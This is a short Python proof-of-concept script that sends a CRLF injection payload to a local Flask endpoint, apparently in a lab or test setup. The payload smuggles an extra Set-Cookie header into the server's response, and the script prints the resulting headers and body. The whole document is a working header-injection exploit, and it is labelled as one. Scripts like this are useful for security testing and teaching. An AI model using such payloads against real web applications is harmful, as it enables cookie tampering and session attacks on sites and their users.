import requests

# Target Flask app
url = "http://localhost:5000/inject"

# Payload: CRLF injection to add a Set-Cookie header
malicious_header = "X-Attack\r\nSet-Cookie: hacked=1"
params = {
    "name": malicious_header,
    "value": "exploit"
}

# Send request
print("[*] Sending exploit payload...")
response = requests.get(url, params=params)

# Output results
print("\n[*] Response Headers:")
for k, v in response.headers.items():
    print(f"{k}: {v}")

print("\n[*] Response Body:")
print(response.text)
